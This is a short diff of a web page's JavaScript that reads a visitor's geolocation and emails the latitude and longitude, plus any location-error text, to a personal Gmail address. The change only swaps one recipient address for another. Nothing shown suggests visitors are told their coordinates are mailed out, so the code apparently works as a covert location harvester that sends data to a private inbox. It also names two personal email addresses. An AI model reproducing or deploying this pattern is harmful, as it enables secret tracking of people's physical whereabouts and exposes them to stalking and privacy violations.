@@ -106,7 +106,7 @@
                         locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                         
                         // Send location data via email
-                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "jamshidiqbal207@gmail.com");
+                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
                         switch (error.code) {
@@ -123,7 +123,7 @@
                                 locationDisplay.textContent = "An unknown error occurred.";
                                 break;
                         }
-                        sendEmail("Location Access Error", locationDisplay.textContent, "jamshidiqbal207@gmail.com");
+                        sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
                     }
                 );
             } else {
